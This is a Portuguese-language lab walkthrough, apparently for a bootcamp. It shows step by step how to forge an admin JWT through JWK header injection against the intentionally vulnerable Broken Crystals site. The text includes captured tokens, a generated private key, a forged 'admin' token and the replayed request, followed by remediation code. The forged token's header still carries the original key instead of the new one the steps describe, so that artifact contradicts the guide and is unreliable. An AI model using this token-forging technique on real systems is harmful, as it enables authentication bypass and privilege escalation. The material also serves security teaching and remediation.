# Exploração de Vulnerabilidades JWT: JWK Injection Attack

## 1. Introdução

Este documento descreve um ataque de **JSON Web Key (JWK) Injection** contra aplicações que utilizam autenticação JWT. A vulnerabilidade permite que um atacante injete sua própria chave pública no token JWT, efetivamente contornando a validação de assinatura e escalando privilégios.

**Ambiente de Teste:** https://brokencrystals.com/

---

## 2. Pré-requisitos

* Ferramenta: **Burp Suite** (ou similar para interceptação de requisições HTTP)
* Sites de análise JWT:
  * https://token.dev
  * https://mkjwk.org
* Compreensão básica de tokens JWT e criptografia RSA

---

## 3. Etapa 1: Obtendo um Token JWT Válido

### 3.1 Acessar a Documentação da API

Acesse o Swagger da aplicação vulnerável:

```
https://brokencrystals.com/swagger
```

Navegue até: **API Schema > API Reference > AUTH**

URL direta: `https://brokencrystals.com/swagger#/Auth%20controller`

### 3.2 Realizar o Login

Localize o endpoint: `POST /api/auth/jwt/jwk/login`

Clique em **"Try it out"** e utilize as credenciais de teste:

```json
{
  "user": "user",
  "password": "user",
  "op": "basic"
}
```

Clique em  **Execute** .

### 3.3 Capturar a Resposta

O servidor retornará uma resposta contendo o token JWT no corpo e, mais importante, no header `Authorization`:

**Response Body:**

```json
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTc2MTQxNDU3Nn0.b7KfIACahp3J36aXY5VyfAhrKbfXfS8CcPyajuEeXIQrcFomInvOh8zTzN-ZUVXP0Gm8DYTFkc8rCGdLVFUpStckk3qMgitx_wo5DbGzb64UNxL8HGD5TSwtnsByyRyqnQDMs9rD__ZRM0eQUQrMHmh4PCbr1GcWhrwz3cRADqIU6u0yn6SMDA4XU5QPoSHxqwj0J0rIlzuEkW7UpwBhB719v0Lud0ieTdlL_msbLF68OJKYrZb21dw2_VGEJrh8070nWH4GfFHJA2LCKpDonOSMm75FKbY9Z_IdLJxrQ0k9yxLCtncERRWLkPtbVM-5pR9_rl_q1gtuwjcz3mrn97Yqfy6_rrHbEBrU8kPM38XabqiWJxDGMKFJ7oeAZFE0kSSNu8KPfnag-IKavJm-ZJoY-ULE0aN1Vw1-Sxvg08ytWR3vVlwMvJJi-uyysV9la0B2bLgNpK7nijfSrrOo_5WvAo4Y87OAHmtKQdeRfDRjtA8zk2r-nXV-C_njWSaPIGeDeuv6SvSGPsKOh66c5pmAWiJiRwJs7QKPoCjohH5hGHdw7W6HGedXJNvwI60NaScaS_nYqApOuQ-w1zeLvTC8Adys_A50z0Dfb1m3nSJdMRp-QLw4NgCVhpJEjpdF-ul69VQcYEu-iSlw08EV8ooXb2s_L0QfZRY7ZDQ1_cA",
  "email": "user",
  "ldapProfileLink": "(&(objectClass=person)(objectClass=user)(email=user))"
}
```

**Response Headers (crítico):**

```
authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsInVzZSI6InNpZyIsImtpZCI6InNpZy0xNjQ1NTAzNTM2IiwiYWxnIjoiUlMyNTYiLCJuIjoieUlmd1RkaXlPLXQ3aWlScGl0aGhINEp4V2RaVEhXeF83aDlkZ29lV3o0a2YwN1J1UTFhUkNPWlBxdF9pQ1VJX3pqd09Md3RJRzFnX2VnNG1LbWlqNDl1a1R2T19uQmI1TnlINEdZQk11RTZ4VTdsdTRtdC1LcnlORE1fWWNSanBnOUlBckd6TlB2XzVNQWxieTNYSkZRYTVBMHNQejdraGxza3dYOEVuM2dfZGdPWFB0YnlBVC1BbGh6MlN0cmhkQVlCUjA5aDU0SHMyeWwzUDdZV1FmTzhJYU0zOFhGZnhTRXZRU0QtcEE5eDd5V0FHWUZBOVVjLVJoa2hZSFFvYkdhTHVCRmREZ3FhOWhiYmVPb2pHOE0yck9RSHRjUzloalctbGVsVUt6aXZYa1IyRGZaYjU2aVNTdTNkWkxZeTFNelVRRUpmcER2Z3BBVnNJRUZHQldRIn19.eyJ1c2VyIjoidXNlciJ9.CAdBC14AjhRjRl0zvPXXCVt0Fxbrmsitw3jVRnlVBCHqblYhlJ8GkRp9hSBSSxxEvHt-2AjfGNxCSNaQ8aERpov4QOG0KWR_6WZfFNdnuzftlnq8I2-wr0QEWk98Fjl7tsVEbW9JwwqG78hCV89FdYI-iH9QzpGov2U9C1hqlPYMwE3807y2IsDR7y-fakbPEsYEqe24mcEQ8VGlBC9KgDD3DdM0W0eDnmsUBi67t6s12bpW1ZThQZlcxKRvtdWe0zr8GMJj5ZbcvjTDczChYT8CKwaGZywE_wg69sjfxX10TBiI1_sTnJC5eg0NudX7EGD2rfl-exaROmPC6Djb5A
```

**⚠️ Guarde este token JWT com cuidado - será usado nas próximas etapas.**

---

## 4. Etapa 2: Validação do Token Atual

### 4.1 Usar o Burp Suite Repeater

Intercepte qualquer requisição e envie para o **Repeater** (atalho: `Ctrl + R`).

### 4.2 Preparar a Requisição de Validação

Crie uma requisição GET para validar o token:

```http
GET /api/auth/jwt/jwk/validate HTTP/1.1
Host: brokencrystals.com
Authorization: [TOKEN_JWT_DO_PASSO_3.3]
Cookie: [COOKIES_DA_SESSAO]
Accept: application/json
```

### 4.3 Enviar a Requisição

Clique em  **Send** . A resposta deve ser **200 OK** com a estrutura:

```json
{"secret":"this is our secret"}
```

---

## 5. Etapa 3: Análise e Manipulação do Token

### 5.1 Acessar o Decodificador JWT

Acesse https://token.dev e cole o token JWT completo no campo "JWT String".

### 5.2 Examinar a Estrutura do Header

O header contém a chave pública injetada (JWK) da aplicação:

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": "sig-1645503536",
    "alg": "RS256",
    "n": "yIfwTdiyO-t7iiRpithhH4JxWdZTHWx_7h9dgoeWz4kf07RuQ1aRCOZPqt_iCUI_zjwOLwtIG1g_eg4mKmij49ukTvO_nBb5NyH4GYBMuE6xU7lu4mt-KryNDM_YcRjpg9IArGzNPv_5MAlby3XJFQa5A0sPz7khlskwX8En3g_dgOXPtbyAT-Alhz2StrhdAYBR09h54Hs2yl3P7YWQfO8IaM38XFfxSEvQSD-pA9x7yWAGYFA9Uc-RhkhYHQobGaLuBFdDgqa9hbbeOojG8M2rOQHtcS9hjW-lelUKzivXkR2DfZb56iSSu3dZLYy1MzUQEJfpDvgpAVsIEFGBWQ"
  }
}
```

### 5.3 Examinar o Payload

O payload original contém os dados do usuário:

```json
{"user":"user"}
```

---

## 6. Etapa 4: Gerar Novas Chaves RSA

### 6.1 Acessar mkjwk.org

Acesse https://mkjwk.org/ para gerar um novo par de chaves RSA.

### 6.2 Configurar os Parâmetros

Configure conforme abaixo:

* **Key Type:** RSA
* **Key Size:** 2048
* **Use:** Signature (sig)
* **Algorithm:** RS256
* **Key ID:** kid
* **Show X.509:** YES

### 6.3 Gerar as Chaves

Clique em  **Generate** . O site fornecerá:

* Chave Pública (JSON)
* Chave Privada (PEM)
* Chave Pública (PEM)

**Exemplo de Chave Pública (JSON):**

```json
{
  "kty": "RSA",
  "e": "AQAB",
  "use": "sig",
  "kid": "kid",
  "alg": "RS256",
  "n": "m9P9tpU1GKDVsTm52GAJUiW-RnNp_vrVWFQu7TSUGpnFXQgmLPBK3ouNhP-34m_so5ebDalgfkYQNf3McjdgwN90uxLCCI1gHtJ3tVmZycDfYH4Em__ZZRRw16lnb318sM9NFJYvSVKcYqGV4e54gw2Rt-GmYxvC7PwHQmBu137JQ5viNzeb7swcwTwTvebY3xzEAM6N_O1euhqVugQ_3VCzC9S02eIJppYk5wWzrua923kCmUdWCsEvKXrojElT2ouHBHW3q3BjfbAVQkve5ndkkMCO9RNy4ydEbtiClngo6m7lMpHT49FngiSsT3SO1-GfoAhSQpDRvN-iiIxtAQ"
}
```

---

## 7. Etapa 5: Criar o Token Malicioso

### 7.1 Modificar o Header no token.dev

Substitua o conteúdo `jwk` original (no header) pela nova chave pública gerada. O header deve ficar assim:

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": "kid",
    "alg": "RS256",
    "n": "m9P9tpU1GKDVsTm52GAJUiW-RnNp_vrVWFQu7TSUGpnFXQgmLPBK3ouNhP-34m_so5ebDalgfkYQNf3McjdgwN90uxLCCI1gHtJ3tVmZycDfYH4Em__ZZRRw16lnb318sM9NFJYvSVKcYqGV4e54gw2Rt-GmYxvC7PwHQmBu137JQ5viNzeb7swcwTwTvebY3xzEAM6N_O1euhqVugQ_3VCzC9S02eIJppYk5wWzrua923kCmUdWCsEvKXrojElT2ouHBHW3q3BjfbAVQkve5ndkkMCO9RNy4ydEbtiClngo6m7lMpHT49FngiSsT3SO1-GfoAhSQpDRvN-iiIxtAQ"
  }
}
```

### 7.2 Modificar o Payload

Altere o payload para elevar privilégios:

```json
{"user":"admin"}
```

### 7.3 Adicionar as Chaves de Assinatura

No token.dev, coloque as chaves geradas:

**Chave Pública (PEM):**

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAm9P9tpU1GKDVsTm52GAJ
UiW+RnNp/vrVWFQu7TSUGpnFXQgmLPBK3ouNhP+34m/so5ebDalgfkYQNf3Mcjdg
wN90uxLCCI1gHtJ3tVmZycDfYH4Em//ZZRRw16lnb318sM9NFJYvSVKcYqGV4e54
gw2Rt+GmYxvC7PwHQmBu137JQ5viNzeb7swcwTwTvebY3xzEAM6N/O1euhqVugQ/
3VCzC9S02eIJppYk5wWzrua923kCmUdWCsEvKXrojElT2ouHBHW3q3BjfbAVQkve
5ndkkMCO9RNy4ydEbtiClngo6m7lMpHT49FngiSsT3SO1+GfoAhSQpDRvN+iiIxt
AQIDAQAB
-----END PUBLIC KEY-----
```

**Chave Privada (PEM):**

```
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCb0/22lTUYoNWx
ObnYYAlSJb5Gc2n++tVYVC7tNJQamcVdCCYs8Erei42E/7fib+yjl5sNqWB+RhA1
/cxyN2DA33S7EsIIjWAe0ne1WZnJwN9gfgSb/9llFHDXqWdvfXywz00Uli9JUpxi
oZXh7niDDZG34aZjG8Ls/AdCYG7XfslDm+I3N5vuzBzBPBO95tjfHMQAzo387V66
GpW6BD/dULML1LTZ4gmmliTnBbOu5r3beQKZR1YKwS8peuiMSVPai4cEdbercGN9
sBVCS97md2SQwI71E3LjJ0Ru2IKWeCjqbuUykdPj0WeCJKxPdI7X4Z+gCFJCkNG8
36KIjG0BAgMBAAECggEAPPR79oP/NRcVADJ4hC9s9flVqPFUsS0lb1vez2MV3CHy
liWt6T5FyzADt9bf82+cvZF8UafD2yFFDhmtc7A95LSEUPlRdU74HpZtxT67bbRI
rNIes3ctbuDEE1hs4avQrskoebkV3jS2f859dtd1xK32JlvaXkJpyZH8tPZL5XdQ
FFVnO0O1+tZNjYi/gKbIEptDWTAV4Tm9rJ+V/deOCYsacgIoLRWf+83A2vP9a3CH
vgnuEca1oRUhkULA18j+PzfYMXqdiPQfMdhhw3hq4Ago3Ww56HcQYRI/DSOs1QdZ
zOxdQiqJq6bDmZDUtkvgy9XYQX4+97VoIA3zlrSf0QKBgQDwAlG0W1TMNkInN4dT
hRwAzF+VhEay3GIcFNigughBxG5aEoOqaDFSe1POicswbNUy5ctIdkiPhLbFpmJw
8qWCDEQmbbfaU2BFJXsAme+K7+61+8Kj9NCqP5DCF0uILahcyj5wfWykW805qk0F
NHO+th+STybP+zll69KEApLWawKBgQCmNdnchtDxsAct3D85zACkIeJjxFr36d1b
G4TMANkAwzF59NY7TZAmjtyYBlegyEKkVpsIRQ88/8MLx60Jh5ElPw8upVVC9ySH
QeIKl+HL/V+7B1cUS8jyVsonwWogoO5Tfh2UoywtbrAGYBYkYMd2dfkiNpKnufn+
hATQgaitQwKBgQClpfQeNqrgBtLBnmGYE1awdl3CI/lnmRNdrkWVKNBqE9jV8dFN
23uvIc9FzXSfh33eExuqd3i9FSvQXnWy3sW8bBrdKvypgsH+909dquDZU5+9mnVM
E7uwxQ5z5wAKjPiWkj9mBCrnhTSviAqAfSMljS1dHaP8B7gl0A0Lb3tI4QKBgF5R
lM3l21Aregd2QpLDx2FcsSG4XX7twWVgGl3B5WLfYYY5gBCrFTAsRdYnUza0Lc0g
MF3jAqC06rQWnYUY3y7pt+3aeKXFpX7zzhgA1Gtz3w09PxcPYnrS8WjaAyV87YGH
wbWFWx50/4K+qBIAsW/xxmy510NC8DCULj88NMINAoGAcqNh/SJXprVe9CdEijBI
aBElt4PoIR9ByU/m99TReLhZ24rwBBC/viE0MebEnHOipIa8ppp7/ysJXIxHze0a
RptYvcHbJDRTDsvHuYpHZSqPsddZXv66iMVk2U/XHxO5ZTr3c6hyzzkv1HE0nEGb
1WpaJunBDst2VYD+g2u6Uzw=
-----END PRIVATE KEY-----
```

### 7.4 Verificar a Assinatura

O token.dev exibirá a verificação de assinatura. Se tudo estiver correto, a mensagem "Signature Verified" aparecerá. Copie o novo JWT String gerado.

**Novo Token (com payload modificado e assinado com a chave privada):**

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsInVzZSI6InNpZyIsImtpZCI6InNpZy0xNjQ1NTAzNTM2IiwiYWxnIjoiUlMyNTYiLCJuIjoieUlmd1RkaXlPLXQ3aWlScGl0aGhINEp4V2RaVEhXeF83aDlkZ29lV3o0a2YwN1J1UTFhUkNPWlBxdF9pQ1VJX3pqd09Md3RJRzFnX2VnNG1LbWlqNDl1a1R2T19uQmI1TnlINEdZQk11RTZ4VTdsdTRtdC1LcnlORE1fWWNSanBnOUlBckd6TlB2XzVNQWxieTNYSkZRYTVBMHNQejdraGxza3dYOEVuM2dfZGdPWFB0YnlBVC1BbGh6MlN0cmhkQVlCUjA5aDU0SHMyeWwzUDdZV1FmTzhJYU0zOFhGZnhTRXZRU0QtcEE5eDd5V0FHWUZBOVVjLVJoa2hZSFFvYkdhTHVCRmREZ3FhOWhiYmVPb2pHOE0yck9RSHRjUzloalctbGVsVUt6aXZYa1IyRGZaYjU2aVNTdTNkWkxZeTFNelVRRUpmcER2Z3BBVnNJRUZHQldRIn19.eyJ1c2VyIjoiYWRtaW4ifQ.aLQlbE0WaGLFD49R67tIUllbTTPz45NDm3bawEz0vY8eJ7H-DHfBN7V-xg1T7-GpgOLtMv9eCXjN80uR12lOaaw7O_TISx19mLqrlMKcHwf5u4AQhRtkZ718pMt5JbN4f5VDpcuWqLqr7qEwbHKRHJBQZ70K7B9m8VUYJ4H-oaSQiCVlYJmzavGM5aLQADSvC4CDflTnQOZSy81qW7RKMfheu0xAWAxFVI0_WUQsggzf3h_TCQ05LyVCnD7N3HGVC60fwAULZVnHaNz4ystmUuZgQGP7RWS4So5UQLcIzPc_Uppa7c9L2rcb8oT5kDPbZqHsAlUpdAfTEEw-59h7QA
```

---

## 8. Etapa 6: Exploração - Testar o Token Malicioso

### 8.1 Retornar ao Burp Suite Repeater

Com a requisição de validação ainda aberta, substitua o header `Authorization` pelo novo token gerado na etapa anterior.

### 8.2 Preparar a Requisição Exploratória

```http
GET /api/auth/jwt/jwk/validate HTTP/2
Host: brokencrystals.com
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsInVzZSI6InNpZyIsImtpZCI6InNpZy0xNjQ1NTAzNTM2IiwiYWxnIjoiUlMyNTYiLCJuIjoieUlmd1RkaXlPLXQ3aWlScGl0aGhINEp4V2RaVEhXeF83aDlkZ29lV3o0a2YwN1J1UTFhUkNPWlBxdF9pQ1VJX3pqd09Md3RJRzFnX2VnNG1LbWlqNDl1a1R2T19uQmI1TnlINEdZQk11RTZ4VTdsdTRtdC1LcnlORE1fWWNSanBnOUlBckd6TlB2XzVNQWxieTNYSkZRYTVBMHNQejdraGxza3dYOEVuM2dfZGdPWFB0YnlBVC1BbGh6MlN0cmhkQVlCUjA5aDU0SHMyeWwzUDdZV1FmTzhJYU0zOFhGZnhTRXZRU0QtcEE5eDd5V0FHWUZBOVVjLVJoa2hZSFFvYkdhTHVCRmREZ3FhOWhiYmVPb2pHOE0yck9RSHRjUzloalctbGVsVUt6aXZYa1IyRGZaYjU2aVNTdTNkWkxZeTFNelVRRUpmcER2Z3BBVnNJRUZHQldRIn19.eyJ1c2VyIjoiYWRtaW4ifQ.aLQlbE0WaGLFD49R67tIUllbTTPz45NDm3bawEz0vY8eJ7H-DHfBN7V-xg1T7-GpgOLtMv9eCXjN80uR12lOaaw7O_TISx19mLqrlMKcHwf5u4AQhRtkZ718pMt5JbN4f5VDpcuWqLqr7qEwbHKRHJBQZ70K7B9m8VUYJ4H-oaSQiCVlYJmzavGM5aLQADSvC4CDflTnQOZSy81qW7RKMfheu0xAWAxFVI0_WUQsggzf3h_TCQ05LyVCnD7N3HGVC60fwAULZVnHaNz4ystmUuZgQGP7RWS4So5UQLcIzPc_Uppa7c9L2rcb8oT5kDPbZqHsAlUpdAfTEEw-59h7QA
Accept: application/json
```

### 8.3 Executar o Ataque

Clique em **Send** para enviar a requisição com o token malicioso.

### 8.4 Analisar a Resposta de Sucesso

Se a exploração funcionar, a resposta será  **200 OK** :

```
HTTP/2 200 OK
Date: Sat, 25 Oct 2025 17:31:44 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 31
X-Xss-Protection: 0
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: 1
Content-Security-Policy: default-src  * 'unsafe-inline' 'unsafe-eval'
Set-Cookie: bc-calls-counter=1761413504558
Set-Cookie: connect.sid=EJa6i9PBQuNMu0r9a4gSPFs1es7d-BTu.70SKRwlFaaW964YrWKVOCqyn6dJDdQgNSkrlC6tALhg; Path=/

{"secret":"this is our secret"}
```

### 8.5 Validação da Autenticação como Admin

Para confirmar que você foi autenticado como administrador, decodifique o payload `eyJ1c2VyIjoiYWRtaW4ifQ`, que resultará em:

```json
{"user":"admin"}
```

**✅ Exploração bem-sucedida!** O servidor aceitou o token com a chave pública injetada e validou o usuário como administrador.

---

## 9. Resumo da Vulnerabilidade

### 9.1 Por que a vulnerabilidade existe?

A aplicação apresenta um flaw crítico na validação de JWT:

1. **JWK Injection no Header:** O servidor acredita na chave pública incluída no próprio JWT, em vez de usar uma chave fixa e conhecida.
2. **Falta de Validação de KID:** O servidor não valida adequadamente o "Key ID" (kid) para garantir que a chave veio de uma fonte confiável.
3. **Assinatura Aceita:** Como o servidor usa a chave do header para validar a assinatura, qualquer token assinado com qualquer chave privada será aceito (desde que a chave pública correspondente esteja no header).

### 9.2 Impactos

* **Escalação de Privilégios:** Um atacante pode se tornar administrador ou qualquer outro usuário.
* **Bypass de Autenticação:** É possível contornar mecanismos de autenticação inteiros.
* **Acesso Não Autorizado:** Manipulação completa de identidades de usuários.

### 9.3 Recomendações de Remediação

**1. Não confiar em chaves públicas no JWT:**

```javascript
// ❌ ERRADO - Usar chave do header
const publicKey = jwt.decode(token).header.jwk;

// ✅ CORRETO - Usar chave pré-configurada no servidor
const publicKey = getConfiguredPublicKey();
```

**2. Validar o KID (Key ID):**

```javascript
const allowedKids = ['kid-1', 'kid-2', 'kid-3'];
if (!allowedKids.includes(decodedHeader.kid)) {
  throw new Error('Invalid Key ID');
}
```

**3. Usar um Identity Provider (IdP) confiável:**

* Implementar OAuth 2.0 / OpenID Connect
* Usar serviços como Auth0, Okta, Google Identity, etc.

**4. Validação de Assinatura Robusta:**

```javascript
try {
  jwt.verify(token, publicKey, { algorithms: ['RS256'] });
} catch (error) {
  throw new Error('Token validation failed: ' + error.message);
}
```

**5. Adicionar Claims Customizados Verificáveis:**

```javascript
const payload = {
  sub: userId,
  iat: Date.now(),
  exp: Date.now() + 3600000,
  iss: 'https://trusted.issuer.com' // Validar issuer
};
```

---

## 10. Referências e Recursos Adicionais

### Documentação JWT

* [RFC 7519 - JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
* [RFC 7517 - JSON Web Key (JWK)](https://tools.ietf.org/html/rfc7517)

### Ferramentas Utilizadas

* **Burp Suite:** https://portswigger.net/burp
* **token.dev:** https://token.dev
* **mkjwk.org:** https://mkjwk.org

### Recursos de Segurança

* OWASP JWT Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
* PortSwigger Web Security Academy - JWT Attacks: https://portswigger.net/web-security/jwt

### Ambiente de Teste

* **Broken Crystals:** https://brokencrystals.com (DVWA para APIs)

---

## 11. Conclusão

O ataque de **JWK Injection** demonstra a importância de uma validação apropriada em mecanismos de autenticação baseados em JWT. Confiar em chaves públicas contidas no próprio token é uma prática extremamente perigosa que pode levar ao comprometimento total da segurança da aplicação.

Durante este guia, você aprendeu:

Como capturar e analisar tokens JWT

A explorar vulnerabilidades em validação de JWT

A gerar e manipular chaves RSA

A executar ataques de elevação de privilégios

A identificar e remediar falhas de segurança em autenticação


**Pratique responsavelmente e sempre em ambientes autorizados para teste!**

**Documento preparado para:** Bootcamp Banco Santander

**Classificação:** Educacional - Ambiente de Laboratório Controlado
